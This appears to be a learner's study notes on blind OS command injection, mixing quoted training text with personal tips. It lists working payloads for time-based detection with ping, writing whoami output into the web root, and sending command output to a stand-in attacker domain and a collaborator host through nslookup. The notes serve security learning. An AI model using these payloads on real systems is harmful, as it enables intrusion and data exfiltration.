->> dosent return feed back 
->> best exploit is to use time base such as ping command 
e.g  & ping -c 10 `127.0.0.1` &  (url encoded)make attacker control time taken for ommand to run most time use sleep 10



### Exploiting blind OS command injection by redirecting output

You can redirect the output from the injected command into a file within the web root that you can then retrieve using the browser. For example, if the application serves static resources from the filesystem location `/var/www/static`, then you can submit the following input:

`& whoami > /var/www/static/whoami.txt &`
its better to use || instead of & as  || will execute always so  || whoami > /var/www/static/whoami.txt ||
->> then search for file in path



### Exploiting blind OS command injection using out-of-band (OAST) techniques

You can use an injected command that will trigger an out-of-band network interaction with a system that you control, using OAST techniques. For example:

`& nslookup kgji2ohoyw.web-attacker.com &`


The out-of-band channel provides an easy way to exfiltrate the output from injected commands:

``& nslookup `whoami`.kgji2ohoyw.web-attacker.com &``
|| nslookup $(whoami)akypyichlpt5qv7tzzd6a7nt7kdc13ps.oastify.com

->>  note !! no space
This causes a DNS lookup to the attacker's domain containing the result of the `whoami` command:

`wwwuser.kgji2ohoyw.web-attacker.com`